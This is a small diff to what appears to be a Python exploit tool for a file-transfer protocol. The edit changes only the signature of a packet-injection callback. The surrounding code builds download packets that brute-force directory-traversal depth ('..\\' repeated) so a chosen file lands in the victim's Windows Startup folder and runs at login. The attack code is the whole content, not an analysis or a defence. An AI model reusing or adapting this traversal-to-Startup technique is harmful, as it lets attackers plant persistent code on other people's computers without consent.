@@ -17,7 +17,7 @@ class FMDownload(Packet):
             super().__init__(b'downloadedfile', clid.encode('utf-8'), compress(f.read()), filename.encode('utf-8'))
 
 
-def startup_bruteforce_filename(clid: str, filename: str, depth: int = 15, inject_packet_between = lambda _: []):
+def startup_bruteforce_filename(clid: str, filename: str, depth: int = 15, inject_packet_between = lambda _1, _2: []):
     p = [FMHandshake(clid)]
     for i in range(2, depth + 3):
         p.append(FMDownload(clid, filename, '..\\' * i + 'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(filename)))
